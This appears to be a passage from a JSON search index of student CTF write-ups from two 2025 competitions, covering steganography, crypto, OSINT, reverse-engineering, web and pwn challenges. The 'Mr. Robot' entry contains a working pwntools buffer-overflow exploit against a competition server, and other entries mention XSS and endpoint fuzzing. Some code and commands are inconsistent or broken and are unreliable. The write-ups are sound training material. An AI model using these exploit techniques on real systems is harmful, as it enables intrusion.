running the binary with a valid input.sharon123@Ramkumar:/mnt/c/Users/sramk/downloads/challenge$ ./unlockerEnter key: ASfgertfghwePassphrase: CYS{mirror_restored_but_soul_shattered} (1st flag obtained)This gives us a passphrase.Step 3: Running Steg analysis on the jpg attachedsharon123@Ramkumar:/mnt/c/Users/sramk/downloads/challenge$ steghide info mirror.jpg\"mirror.jpg\": format: jpeg capacity: 564.0 ByteTry to get information about embedded data ? (y/n) yEnter passphrase: # enter the obtained passphrase embedded file \"flag.txt\": size: 29.0 Byte encrypted: rijndael-128, cbc compressed: yesExtract the embedded file with steghide:sharon123@Ramkumar:/mnt/c/Users/sramk/downloads/challenge$ steghide extract -sf mirror.jpgEnter passphrase:wrote extracted data to \"flag.txt\".sharon123@Ramkumar:/mnt/c/Users/sramk/downloads/challenge$ cat flag.txtCYS{r3fl3ct10n_r3st0r3d_B2A}Flags CYS{mirror_restored_but_soul_shattered} — (this flag keeps the player in the denier path, B) CYS{r3fl3ct10n_r3st0r3d_B2A} — (this flag makes the player shift from denier path B, to healer path, A)" }, { "title": "It ain't here", "url": "/writeups/CyberConverge_2025/10-itainthere.html", "categories": "Reverse engineering", "tags": "", "date": "", "snippet": "It ain’t here Author: Aakansh Gupta (Unknown)Lets first run the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/6]└─$ ./challenge.runVerifying archive integrity... 100% MD5 checksums ar...", "content": "It ain’t here Author: Aakansh Gupta (Unknown)Lets first run the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/6]└─$ ./challenge.runVerifying archive integrity... 100% MD5 checksums are OK. All good.Uncompressing It ain't here 100% Can you really break the pincode? ...Try if you must: Entering any wrong pin shows bad pin and exits the program. What we can try is “Keyboard Interrupt In Linux” by pressing ctrl+c during execution. This shows us the location of the executing python script.Can you really break the pincode? ...Try if you must: ^CTraceback (most recent call last): File \"/tmp/selfgz116517/./pin_checker.py\", line 105, in &lt;module&gt; main() File \"/tmp/selfgz116517/./pin_checker.py\", line 82, in main pin = input(\"Try if you must: \")KeyboardInterruptSignal caught, cleaning upBut visiting it after execution shows nothing. So we try and access it while executing the program. Here we find a python file with tons of flags.But what we need is the flag from this function:def generate_real_flag(pin): FLAG_PREFIX = \"CBCV{}\" hashed_pin = hashlib.blake2b((pin + \"blindinglights\").encode(\"utf-8\")).hexdigest()[:32] return FLAG_PREFIX % hashed_pinThis is called when entered pin is 98315. Use this to get the correct flag with the program.if pin == \"98315\": print(\"Looks good to me...\") print(\"I guess I'll generate a flag\") try: req = requests.get(\"http://example.com\", timeout=2) req.raise_for_status() except requests.exceptions.RequestException: print(\"Warning: Could not verify secondary network status.\") real_flag = generate_real_flag(pin) print(real_flag) else: print(\"Bad pin!\")The flag found is:CBCV{b07faa19997299630d615b1a9579d64f}" }, { "title": "Temporal Core Console", "url": "/writeups/FinalTrace_2025/10-temporal-core-console.html", "categories": "General", "tags": "", "date": "", "snippet": "Temporal Core ConsoleCategory: Forensics/CryptoAuthor: Varsaa HChallenge DescriptionThe Eon city has lost its memory core. You must analyze recovered data fragments, decode hidden signals, and reco...", "content": "Temporal Core ConsoleCategory: Forensics/CryptoAuthor: Varsaa HChallenge DescriptionThe Eon city has lost its memory core. You must analyze recovered data fragments, decode hidden signals, and recover the temporal flag to restore the city’s heart.SolutionInitial AnalysisDownloaded and inspected the provided artifacts: temporal_core.log core_fragment.bin memory_snapshot.img temporal_beacon.wav EON_FINAL.encTools Used strings, xxd, base32, python Audacity (or any WAV audio analyzer) CyberChef (online multi-tool for encodings) pycryptodome (Python AES library)Step-by-Step SolutionStep 1: Inspect the Memory Dump for Keysstrings memory_snapshot.imgtextFound: AES Key: EONSYNCHRONIZE12 IV: SYNCWAVESFLOW1234Step 2: Decode the Logcat temporal_core.log | awk ‘{print $2}’ | tr -d ‘\\n’ &gt; log.base32base32 -d log.base32 &gt; fragment.bintextBase32-decoded the log, yielding an encrypted blob matching core_fragment.bin.Step 3: AES Decrypt the Fragmentfrom Crypto.Cipher import AESkey = b’EONSYNCHRONIZE12’iv = b’SYNCWAVESFLOW1234’with open(‘core_fragment.bin’, ‘rb’) as f:data = f.read()def unpad(s): return s[:-s[-1]]cipher = AES.new(key, AES.MODE_CBC, iv)plaintext = cipher.decrypt(data)print(unpad(plaintext).decode())textOutput:This is the beacon. Decode its pulse next. QR in sound…textPoints to the audio file next.Step 4: Decode temporal_beacon.wav (Morse) Loaded temporal_beacon.wav in an online Morse decoder or Audacity. Decoded message: RECONSTRUCT THE CYCLE REVERSED SHA1 - FOLLOW THE PULSE This hints the final XOR key is SHA1(reversed_flag).Step 5: Decrypt EON_FINAL.encimport hashlibflag = “CYS{E0N_SYNCHRONIZED_2F3C}”rev = flag[::-1]sha1key = hashlib.sha1(rev.encode()).hexdigest()key_bytes = bytes.fromhex(sha1key)with open(‘EON_FINAL.enc’, ‘rb’) as f:data = f.read()decrypted = ‘‘.join(chr(b ^ key_bytes[i % len(key_bytes)]) for i, b in enumerate(data))print(decrypted)textOutput:CYS{E0N_SYNCHRONIZED_2F3C}textFlagCYS{E0N_SYNCHRONIZED_2F3C}" }, { "title": "Layers", "url": "/writeups/CyberConverge_2025/11-layers.html", "categories": "Cryptography", "tags": "", "date": "", "snippet": "Layers Author: Om MishraDescriptionThe challenge provides an encoded string. It is encrypted using a Caesar cipher with a shift of 7, then Base64 encoded.Steps to Solve Take the given encoded str...", "content": "Layers Author: Om MishraDescriptionThe challenge provides an encoded string. It is encrypted using a Caesar cipher with a shift of 7, then Base64 encoded.Steps to Solve Take the given encoded string: Q0JEVntrb3RyeX...} First, decode it from Base64. Next, apply a Caesar cipher decryption with shift = 19. You will get the final flag.FlagCBCV{cRy9T0_L4y3r5_4RE_FuN_3135}" }, { "title": "The Watcher's Gaze", "url": "/writeups/FinalTrace_2025/11-the-watchers-gaze.html", "categories": "OSINT", "tags": "", "date": "", "snippet": "The Watcher’s Gaze Category: [OSINT] Author: [Akshitha]Challenge DescriptionGo through a variety of open source data and find out the observer’s den. Follow lyra’s trail but beware do not get cau...", "content": "The Watcher’s Gaze Category: [OSINT] Author: [Akshitha]Challenge DescriptionGo through a variety of open source data and find out the observer’s den. Follow lyra’s trail but beware do not get caught. All you need is right infront of your eyes, just know where to look.SolutionInitial AnalysisBuild up a narrative, look at various social media platforms, come up with a cohesive plot that built on the story.Tools Used Metadat2go Instagram Github Google docsStep-by-Step SolutionStep 1: The ImageThe binary numbers are decoys, they dont point to anything importantThings to dedue:i.\tBottom right: Instagram account (hinted by the purple/ blue colour scheme) @LC_HOURGLASSii.\tExtracting meta dataWe see a hex value (6B011D)It is a part of the flag, to be noted and keptStep 2: The Instagram accountThe bio points to a username (Caellum-Archivist)Upon inspection of the post caption, the last line has weird capitalizationIn the word gift notice only capital letters (GIT)Step 3: The githubIn the old haven archive90210 points to a famous los angeles pincodeThe reset attempts are dummiesShes-gone-and-its-just-me-repo:-Multiple access_gate decoys so even if we want to get password from code it takes a little bit of timeREADME points to a linkEnter the CITY NAMECode- losangles/laStep 4: The Google DocThe information is all fillerLocation coordinates of the picture point toGriffith Observatory : 34.1184° N, 118.3004° WRest of the text is white and revealed when selectedTime: 12:47 + 3mins+ 1 sec12:50:01Piece together final flag from “VITAL DATA”FlagCYS{341184_125001_6B011D}" }, { "title": "Challenge Name - EXIF ECHOES", "url": "/writeups/FinalTrace_2025/12-challenge-name-exif-echoes.html", "categories": "Forensics/OSint", "tags": "", "date": "", "snippet": "Challenge Name - EXIF ECHOES Category: [Forensics/OSint] Author: [ram]Challenge Description[This m0ment is more than it appears. Its very properties are… peculiar. Only by understanding its deepe...", "content": "Challenge Name - EXIF ECHOES Category: [Forensics/OSint] Author: [ram]Challenge Description[This m0ment is more than it appears. Its very properties are… peculiar. Only by understanding its deepest whispers can you unlock the path.]SolutionInitial Analysis[As the challenge title suggests “EXIF,” the first step is to run exiftool on the image. This would reveal two unusual timestamps. The “echoes” hint at a combination of these two values.]Tools Used [exiftool] [timestamp-&gt;epoch unix ( https://www.epochconverter.com/ ) ] [ Hexadecimal XOR calculator (e.g., [https://xor.pw/] ] [stegseek]Step-by-Step SolutionStep 1: [Discover and Convert Timestamps][exiftool m0ment.jpg][they scan exiftool, encounter a fake flag , which is a pastebin link which gives them sime vague hint ( btw bonus flag hidden as the authorname )(pastebin.com/r3LnLw4G ) ]Step 2: [Generate the Passphrase via XOR][# No command, but use a hex XOR calculator# Input 1 (hex): 1681140600# Input 2 (hex): 1727203620 # Output (hex): 1a6343020][This step accomplishes the core trick of the challenge. By treating the two epoch values as hexadecimal numbers and XORing them, we generate the final passphrase (1a6343020) needed for extraction.]Step 3: [Extract the Hidden File , and hence the flag]echo \"1a6343020\" &gt; pass.txtstegseek m0ment.jpg pass.txtcat m0ment.jpg.out[This command uses stegseek to rapidly test our generated password (1a6343020) against the image. stegseek confirms the password is correct and extracts the hidden file, saving it as m0ment.jpg.out.]FlagsCYS{b0nus_fl1g_686}CYS{T1m3_Fr4gm3nt5_R3v34l_Th3_P4th}" }, { "title": "Locked", "url": "/writeups/CyberConverge_2025/12-locked.html", "categories": "Reverse engineering", "tags": "", "date": "", "snippet": "Locked Author: Aakansh Gupta (Unknown)Lets first run the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/5]└─$ ./challenge.run Verifying archive integrity... 100% Error in MD5 checksums:...", "content": "Locked Author: Aakansh Gupta (Unknown)Lets first run the file and its properties┌──(kali㉿kali)-[~/Desktop/Cyscom/5]└─$ ./challenge.run Verifying archive integrity... 100% Error in MD5 checksums: cd6432c66be8a7696954be1324b594cf is different from 6432c66be8a7696954be1324b594cfRunning the file tells us that there are errors in MD% checksums.If we try to match the hash using editors like VSCode or Nano (Non-hex editors), the file is corrupted.┌──(kali㉿kali)-[~/Desktop/Cyscom/5]└─$ ./challenge.run Verifying archive integrity... Unexpected archive size.To try and fix the MD5 Check, we need to use hex editors like hexedit. We know 2 in hex is 32 and 0 in hex is 30.Replace these values with the hexeditor where there are 0s.Now run the file again. We get the flag┌──(kali㉿kali)-[~/Desktop/Cyscom/5]└─$ ./challenge.run Verifying archive integrity... 100% MD5 checksums are OK. All good.Uncompressing Lost in the Wild 100% CBCV{h3x_3dIt0r5_t0_Th3_r3scU3_9364}The flag found is:CBCV{h3x_3dIt0r5_t0_Th3_r3scU3_9364}" }, { "title": "Look beyond what you see", "url": "/writeups/CyberConverge_2025/13-lbys.html", "categories": "misc", "tags": "", "date": "", "snippet": "Look beyond what you see Created by: P C Guhan (DaBot)Description Look beyond what you see (Change the brackets in the flag to {} when submitting)output.txtSolutionUpon opening the txt file in a ...", "content": "Look beyond what you see Created by: P C Guhan (DaBot)Description Look beyond what you see (Change the brackets in the flag to {} when submitting)output.txtSolutionUpon opening the txt file in a standard hex editor, we find that the file consists of only 3 characters - \\x00 (null), \\x20 (space) and \\xe2\\x80\\x8b (Zero Width Space). Here we substitute \\x00 as a space, \\x20 as ‘.’ and \\xe2\\x80\\x8b as ‘- and get the morse code encoded text. We then decode it to get the flag.Script:import redef substitute_morse_escaped(filename, output_filename): with open(filename, \"r\", encoding=\"utf-8\") as f: raw_text = f.read() decoded_bytes = raw_text.encode(\"utf-8\").decode(\"unicode_escape\").encode(\"latin1\") decoded_bytes = decoded_bytes.replace(b\"\\xe2\\x80\\x8b\", b\"-\") decoded_bytes = decoded_bytes.replace(b\"\\x20\", b\".\") decoded_bytes = re.sub(b'\\x00{3,}', b' ', decoded_bytes) decoded_bytes = re.sub(b'\\x00', b' ', decoded_bytes) morse_code = decoded_bytes.decode(\"utf-8\") with open(output_filename, \"w\", encoding=\"utf-8\") as out: out.write(morse_code)if __name__ == \"__main__\": substitute_morse_escaped( \"hexa.txt\", \"morse_output.txt\" )morse_output.txtFinal flag reterived:CBCV{MORSE_OR_REMORSE}" }, { "title": "Sneaky Notes", "url": "/writeups/FinalTrace_2025/13-sneaky-notes.html", "categories": "Web", "tags": "", "date": "", "snippet": "Sneaky Notes Category: [Web] Author: [Akshitha]Challenge DescriptionSome notes were left behind, look deeper and you will find what is yours.SolutionInitial AnalysisLook at easy potential web exp...", "content": "Sneaky Notes Category: [Web] Author: [Akshitha]Challenge DescriptionSome notes were left behind, look deeper and you will find what is yours.SolutionInitial AnalysisLook at easy potential web exploits to useTools Used Python FlaskStep-by-Step SolutionStep 1: Login pageStep 2:\tInspect and get credentialsStep 3 :XSS payload in notes page to get flag#### Step 4:\tFlag found FlagCYS{sneaky_notes_xss}" }, { "title": "Monoalphabetic Shenanigans", "url": "/writeups/CyberConverge_2025/14-monoal2.html", "categories": "cryptography", "tags": "", "date": "", "snippet": "Monoalphabetic Shenanigans Author: P C Guhan (DaBot)Description Looks Secure? Check againAdd the CBCV{flag} and underscores while submitting the flag (ALL CAPS)script_redacted.py:def __(_0, _1, _...", "content": "Monoalphabetic Shenanigans Author: P C Guhan (DaBot)Description Looks Secure? Check againAdd the CBCV{flag} and underscores while submitting the flag (ALL CAPS)script_redacted.py:def __(_0, _1, _2, _3): ___ = list(map(ord, _3)) ____ = (_0 &lt;&lt; 0) ^ (_1 &gt;&gt; 0) ^ (_1 - _1) _____ = (_1 ^ 0) * (_2 ^ 0) return [__import__(\"builtins\").pow(x, ____ or _0, _____) for x in ___]with open(\"plaintext.txt\", \"r\") as f: T = f.read().strip()p = REDACTEDq = REDACTEDe = 65537output = __(e, p, q, T)with open(\"output.txt\", \"w\") as f: f.write(str(output))output.txtSolutionHere, RSA is implemented by converting each letter to its ASCII value and then encrypting it. Hence each letter will have the same encrypted value. Since there are only 26 unique encoded numbers, we can map each cipertext to a letter. Once mapped, the cipertext needs to be replaced with the letter and then a frequency analysis can be run.A frequency analysis refers to the guessing of the correct cipertext based on the number of occurences of a letter in the text. This can be done using online tools.Script:import reimport stringdef read_encrypted(filename): with open(filename, \"r\") as f: content = f.read() return list(map(int, re.findall(r\"\\d+\", content)))def map_numbers_to_letters(encrypted_numbers): unique_numbers = sorted(set(encrypted_numbers)) if len(unique_numbers) &gt; 26: raise ValueError(f\"Too many unique numbers: {len(unique_numbers)} (max 26 allowed)\") letters = list(string.ascii_lowercase) mapping = {num: letter for num, letter in zip(unique_numbers, letters)} return mappingdef substitute_numbers_with_letters(encrypted_numbers, mapping): return \"\".join(mapping.get(num, \"?\") for num in encrypted_numbers)def main(): encrypted_file = \"output.txt\" decoded_file = \"test.txt\" encrypted_numbers = read_encrypted(encrypted_file) mapping = map_numbers_to_letters(encrypted_numbers) decoded_text = substitute_numbers_with_letters(encrypted_numbers, mapping) with open(decoded_file, \"w\") as f: f.write(decoded_text)if __name__ == \"__main__\": main()Output:test.txtThe we need to do frequency analysis on the output file i.e. test.txt.Upon doing frequency analysis using online resources. We get the frequency of each letter and the approximate substitution which will give us the desired result.This webiste: https://www.dcode.fr/frequency-analysis provides the ability to directly substitute the required letters and the gives the flag as FLAGFREQUENCYANALYSISFTW.Final flag reterived:CBCV{FREQUENCY_ANALYSIS_FTW}" }, { "title": "EON GATE", "url": "/writeups/FinalTrace_2025/14-sneaky-notes.html", "categories": "Web", "tags": "", "date": "", "snippet": "Sneaky Notes Category: [Web] Author: [Akshitha]Challenge DescriptionWhy wont the gate open?SolutionInitial AnalysisThe riddle and its relation with the given blocks.Tools Used Pyhton FlaskStep-...", "content": "Sneaky Notes Category: [Web] Author: [Akshitha]Challenge DescriptionWhy wont the gate open?SolutionInitial AnalysisThe riddle and its relation with the given blocks.Tools Used Pyhton FlaskStep-by-Step SolutionStep 1: Read the riddleStep 2:\tRearrange the wordsStep 3 :Submit and get the flagFlagCYS{EON_REALIGNED}" }, { "title": "Mirror Shatter", "url": "/writeups/FinalTrace_2025/15-challenge-name.html", "categories": "Web", "tags": "", "date": "", "snippet": " Category: Web Author: KirubahariChallenge DescriptionThe Challenge is about web enumeration and find the hidden endpoints and parameters to get the flagSolutionInitial AnalysisWhat I did first -...", "content": " Category: Web Author: KirubahariChallenge DescriptionThe Challenge is about web enumeration and find the hidden endpoints and parameters to get the flagSolutionInitial AnalysisWhat I did first - enumeration, bruteforcing for endpointsTools Used ffuf base64 pythonStep-by-Step SolutionStep 1: Finding the endpointffuf -u \"http://$IP:$PORT/FUZZ\" -w WORDLIST --icIt gives the hidden endpointStep 2: Fidning the parameterffuf -u \"http://$IP:$PORT/mirror?FUZZ=true\" -w WORDLIST --ic -fs int(x)Which gievs the hiddenendpoint which downlaods the zip file which has the encoded flagStep 3: Decoingcat flag.txt | base64 -dwhich gives the decoded dna encoded text decoding gives the flagScriptimport sysMAP = { 'A': '00', 'C': '01', 'G': '10', 'T': '11'}def dna_to_bytes(dna: str) -&gt; bytes: dna = ''.join(dna.split()) if len(dna) % 4 != 0: raise ValueError(\"DNA length not multiple of 4 (each byte = 4 nucleotides).\") bits = ''.join(MAP[nuc] for nuc in dna) out = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8)) return outdef main(): if len(sys.argv) == 2 and sys.argv[1] != '-': s = open(sys.argv[1], 'r').read() else: s = sys.stdin.read() try: b = dna_to_bytes(s) print(b.decode('utf-8')) except Exception as e: print(\"Decoding failed:\", e, file=sys.stderr) try: b = dna_to_bytes(s.strip()) import binascii print(\"HEX:\", binascii.hexlify(b).decode()) except: pass sys.exit(1)if __name__ == '__main__': main()FlagCYS{B43aking_th3_m1rr0r_1$_c00l}" }, { "title": "Mouse Trap", "url": "/writeups/CyberConverge_2025/15-mousetrap.html", "categories": "cyptography", "tags": "", "date": "", "snippet": "Mouse Trap Author: Akshaya HThe mouse is trapped inside the “system cheese” and we should save it, but how?connect to the server using: nc 20.244.12.130 50005The server starts the challange.Step 1...", "content": "Mouse Trap Author: Akshaya HThe mouse is trapped inside the “system cheese” and we should save it, but how?connect to the server using: nc 20.244.12.130 50005The server starts the challange.Step 1: Break the Secret LocksFirst, we had a SHA-256 hash and generally SHA-256 can be “decrypted”, using decoders.Use: https://www.dcode.fr/sha256-hashThis will give us the name of the cheese which they are trapped in.Then comes the Playfair cipher – an old-school pen-and-paper cipher where letters are scrambled using a 5×5 grid. We just needed to check if the given Playfair text matched the expected decrypted form.So basically: Encrypt the cheese name using Playfair message for the escape sequence. This is to crack the “LR Dance”For the Playfair Cipher,Use: https://encryptdecrypt.tools/tools/ciphers/playfair.phpOnce the cipher text was ready, we have to do the next trick:Odd-positioned letters - R (Right)Even-positioned letters - L (Left)This gives us a secret L/R sequence.Enter the sequence, which finally reveals the flag.Using this script, we can find the key.import hashlibimport randomimport stringdef sha256(x): return hashlib.sha256(x.encode()).hexdigest()def load_cheeses(filename=\"cheese.txt\"): with open(filename, \"r\") as f: cheeses = [line.strip() for line in f if line.strip()] return cheesesdef generate_playfair_key_matrix(key): key = key.upper().replace(\"J\", \"I\") matrix = [] used = set() for char in key: if char not in used and char in string.ascii_uppercase: matrix.append(char) used.add(char) for char in string.ascii_uppercase: if char == \"J\": # skip J continue if char not in used: matrix.append(char) used.add(char) return [matrix[i:i+5] for i in range(0, 25, 5)]def find_position(matrix, char): for r, row in enumerate(matrix): for c, val in enumerate(row): if val == char: return r, c return Nonedef playfair_encrypt(text, matrix): text = text.upper().replace(\"J\", \"I\") prepared = [] i = 0 while i &lt; len(text): a = text[i] b = \"\" if i+1 &lt; len(text): b = text[i+1] if a == b: b = \"X\" i += 1 else: i += 2 if b == \"\": b = \"X\" prepared.append((a, b)) cipher = \"\" for a, b in prepared: r1, c1 = find_position(matrix, a) r2, c2 = find_position(matrix, b) if r1 == r2: cipher += matrix[r1][(c1+1)%5] + matrix[r2][(c2+1)%5] elif c1 == c2: cipher += matrix[(r1+1)%5][c1] + matrix[(r2+1)%5][c2] else: cipher += matrix[r1][c2] + matrix[r2][c1] return cipherdef cipher_to_lr(cipher_text): sequence = \"\" for ch in cipher_text: if not ch.isalpha(): continue idx = ord(ch) - ord('A') + 1 if idx % 2 == 0: sequence += \"L\" else: sequence += \"R\" return sequencedef main(): print(\"🐭 Welcome to the Mouse &amp; Cheese Playfair Challenge! \") cheeses = load_cheeses(\"cheese.txt\") cheese = random.choice(cheeses) target_hash = sha256(cheese) print(\"\\nThe mouse whispers: 'Here’s the hash of my cheese...'\") print(\"Hash:\", target_hash) user_cheese = input(\"\\n🔍 Enter the cracked cheese word: \").strip() if user_cheese.lower() != cheese.lower(): print(\"Wrong cheese! The mouse stays trapped...\") return print(\"Correct cheese! Now, encrypt it with a cipher, Wheatstone's friend loved to play so much...\") matrix = generate_playfair_key_matrix(\"mousecheese\") cipher_text = playfair_encrypt(user_cheese.upper(), matrix) user_cipher = input(\"\\nEnter the Playfair ciphertext: \").strip().upper() if user_cipher != cipher_text: print(\"\\n[!] Wrong ciphertext! The mouse shakes its head...\") return print(\"\\n[+] Correct ciphertext! The mouse is impressed.\") print(\"\\n Clue for the final path:\") print(\" Oh, maybe the 'odd' ones are always 'left (L)' out in the list.\") print(\" And the rest all are 'right' to be split 'even'! \") print(\" Work it out, smartie! \") correct_lr = cipher_to_lr(cipher_text) print(correct_lr) user_lr = input(\"\\nEnter the full sequence: \").strip().upper() if user_lr == correct_lr: print(\"\\n CYBER{m0u$etr@p}\") else: print(\"\\n [!] Wrong sequence using L/R! The mouse laughs at your attempt...\")if _name_ == \"_main_\": main()The flag found is:CBCV{M0u23_7Ra95_DAng3r_5342}" }, { "title": "Mr. Robot", "url": "/writeups/CyberConverge_2025/16-mrrobot.html", "categories": "pwn", "tags": "", "date": "", "snippet": "Mr. Robot Author: Aakansh Gupta (Unknown)Classic Buffer Overflow CTF.Connecting to the server through netcat gives:┌──(kali㉿kali)-[~/Desktop/Cyscom/3]└─$ nc 20.244.12.130 50001Who is the leader of...", "content": "Mr. Robot Author: Aakansh Gupta (Unknown)Classic Buffer Overflow CTF.Connecting to the server through netcat gives:┌──(kali㉿kali)-[~/Desktop/Cyscom/3]└─$ nc 20.244.12.130 50001Who is the leader of fsociety? Enter your answer &gt; Any answer to this returns:┌──(kali㉿kali)-[~/Desktop/Cyscom/3]└─$ nc 20.244.12.130 50001Who is the leader of fsociety? Enter your answer &gt; Elliot AldersonYou aren't thinking straight Elliot!We try to decompile the file using decompilers like gdb and check breakpoints after entering a huge value:pwndbg&gt; runStarting program: /home/kali/Desktop/Cyscom/3/vuln [Thread debugging using libthread_db enabled]Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".Who is the leader of fsociety? Enter your answer &gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Program received signal SIGSEGV, Segmentation fault.Use this data to find the value overriden by the RIP register. Use ` cyclic -l 0x6161616b6161616a ` (for example only) to find offset vlaue with RIP register. Now find the ` win() ` function address within gdb using print win . Similarly, find the ret gadget using ` ROPgadget –binary ./vuln –only “ret” ` outside gdb.We are using a pwntools exploit script to automatically run and get the flag from the server using the values we found.from pwn import *context.arch = 'amd64'offset = 72win_address = 0x4011b6ret_gadget = 0x401016p = remote(\"20.244.12.130\", 50001)payload = b'A' * offset + p64(ret_gadget) + p64(win_address)log.info(f\"Payload: {payload}\")p.recvuntil(b'&gt; ')p.sendline(payload)p.interactive()Running the script produces the output as the required flag.The flag found is:CBCV{BuFf3r_0v3rF10W_1s_s1mpL3_9713}" }, { "title": "Echoes in the Hourglass", "url": "/writeups/FinalTrace_2025/16-unknown-challenge.html", "categories": "General", "tags": "", "date": "", "snippet": " Author: Vishal VChallenge DescriptionAn hourglass image from the Citadel’s archives hides the encryption key to twelve lost timeline fragments (timeline_grain_*.bin).Each fragment carries a piece...", "content": " Author: Vishal VChallenge DescriptionAn hourglass image from the Citadel’s archives hides the encryption key to twelve lost timeline fragments (timeline_grain_*.bin).Each fragment carries a piece of the Citadel’s final chronicle. Recover the cipher key, decrypt all fragments, and rebuild the temporal log to restore the flow of time — and uncover the last message trapped within.SolutionSolution Summary (Internal Dev Notes):1.Extract stego data → recover cipher_key.bin.2.Decrypt fragments using the provided XOR script.3.Decrypt the timestamp log via openssl aes-256-cbc.4.Reassemble the decrypted fragments in chronological order.5.The flag appears in one fragment: timeline_grain_autd.txt.Initial AnalysisI listed the archive contents, inspected the image for hidden data, and examined the provided scripts. The image looked like a likely steganography container and the repository included a small XOR script (scripts/temporal_cipher.py) which suggested an XOR-based encryption of the fragments. There was also a timestamp_log.enc that was encrypted using openssl. A Hint.txt was also present having some necessary passwords which where md5 hashed.Tools Used•\tsteghide (to inspect/extract data from the image)•\tpython3 (to run scripts/temporal_cipher.py)•\tOnline md5 decrypting toolsStep-by-Step SolutionStep 1: Unpack and inspectunzip citadel_memory_dump.zipls -lahfile hourglass_of_time.jpgsteghide info hourglass_of_time.jpgI confirmed the hourglass_of_time.jpg contains embedded data(cipher_key.bin) with steghide info.The passkey(echoes) for steghide was hidden in the hint.txt which could be broken using online md5 decrypting tools.Step 2: Extract the cipher key from the imagesteghide extract -sf hourglass_of_time.jpg -p echoes -xf cipher_key.binUsing the steghide password (echoes), I extracted cipher_key.bin. This key is required to XOR-decrypt the timeline grains.Step 3: Decrypt one fragment (smoke test)chmod +x scripts/temporal_cipher.py./scripts/temporal_cipher.py timeline_grain_ 3w@e.bin cipher_key.bin grain_ 3w@e.txtThis validated the key and script: the output showed readable part of the temporal log.Step 4: Decrypt all fragmentsfor b in *.bin; do ./scripts/temporal_cipher.py “$b” cipher_key.bin “${b%.bin}.txt”done Each fragment decrypted into a .txt file.Step 5: Decrypt the timestamp_log.encfile timestamp_log.encoutput: timestamp_log.enc: openssl enc’d data with salted passwordThis makes it clear that the file was encrypted using openssl. The password can be taken from hint.txt. The most common encryption in openssl is aes-256 hence try decrypting by that: openssl enc -aes-256-cbc -pbkdf2 -salt -in timestamp_log.txt -out timestamp_log.enc -pass pass:passwordDecrypted file stored as timestamp_log.txtStep 6: Reconstruct the full logWith reference to timestamp_log.txt reconstruct each file fragment.Concatenating the decrypted fragments in timestamp order reconstructed the original temporal log.Step 7: Extract the flagThe flag is present in the final temporal log. Note: the flag is present in only one of the file fragments: timeline_grain_autd.txt, so instead of concatenating based on timestamp_log.txt the player may individually open all the 12 files to find the flag. Either way this makes this challenge time consuming. There are also 2 decoy files that are present only to confuse the player: corrupted_grain_xx.bin,memory_alpha.txt.Flag:FLAG{HOURGLASS_RECOVERED}" }, { "title": "Temporal Freeze Upgrade", "url": "/writeups/FinalTrace_2025/17-ctf-27-temporal-freeze-upgrade-walkthrough.html", "categories": "General", "tags": "", "date": "", "snippet": "Temporal Freeze UpgradeObjectiveSolve the mirror puzzle to decrypt the flag: cys{T1M3_SYNC}Step 1: Understand the MirrorsYou have 4 mirrors to select in the correct order: Mirror 0 (◈) - 0x00 Mir...", "content": "Temporal Freeze UpgradeObjectiveSolve the mirror puzzle to decrypt the flag: cys{T1M3_SYNC}Step 1: Understand the MirrorsYou have 4 mirrors to select in the correct order: Mirror 0 (◈) - 0x00 Mirror 1 (◉) - 0x01 Mirror 2 (◊) - 0x02 Mirror 3 (◆) - 0x03Step 2: Find the PatternLook at the QUANTUM_STATE_DECAY values: Mirror 0: Decay = 5 Mirror 1: Decay = 8 Mirror 2: Decay = 3 Mirror 3: Decay = 6Key Insight: Order mirrors by lowest to highest dec ay value.Step 3: Correct SequenceClick mirrors in this order: Mirror 2 (◊) - Decay 3 Mirror 0 (◈) - Decay 5 Mirror 3 (◆) - Decay 6 Mirror 1 (◉) - Decay 8Step 4: Get the Encrypted FlagWhen solved correctly, you’ll see:DECRYPTION_KEY: [encrypted characters]Copy this encrypted string.Step 5: Decrypt the FlagOpen Browser Console (F12) and paste:const encryptedFlag = \"[PASTE_YOUR_ENCRYPTED_KEY_HERE]\";for (let offset = 1; offset &lt;= 50; offset++) { let decrypted = ''; for (let i = 0; i &lt; encryptedFlag.length; i++) { decrypted += String.fromCharCode(encryptedFlag.charCodeAt(i) - offset); } if (decrypted.startsWith('cys{')) { console.log('Flag: ' + decrypted); break; }}Step 6: Submit FlagThe decrypted flag will appear in console:cys{T1M3_SYNC}Tips Use ANALYZE button for hints if stuck Watch TEMPORAL_ALIGNMENT section as you select The decay values are the key to solving it Wrong sequence resets after 3 seconds Each solve generates a unique encrypted flagQuick Reference| Position | Mirror | Symbol | Decay ||———-|——–|——–|——-|| 1st | 2 | ◊ | 3 || 2nd | 0 | ◈ | 5 || 3rd | 3 | ◆ | 6 || 4th | 1 | ◉ | 8 |" }, { "title": "My hostel room key", "url": "/writeups/CyberConverge_2025/17-mhrk.html", "categories": "misc", "tags": "", "date": "", "snippet": "My hostel room key Author: K S Vignesh Decode the key given in the text file 3 times using Base64 to get a decrypted string. You will find a Google Drive link — follow it. You w...", "content": "My hostel room key Author: K S Vignesh Decode the key given in the text file 3 times using Base64 to get a decrypted string. You will find a Google Drive link — follow it. You will get a PDF there; go to the last page and you will find another Google Drive link to download an image. Download the image and open it using Notepad. There you will see a flag-like text inside curly brackets, but it is not the final flag (you’re almost there). Decode the string present inside the curly brackets 6 times using Base64. You will get the final answer, which should be placed inside curly brackets. FLAG: CBCV{FINAL_FLAG}" }, { "title": "Lyra's Photos", "url": 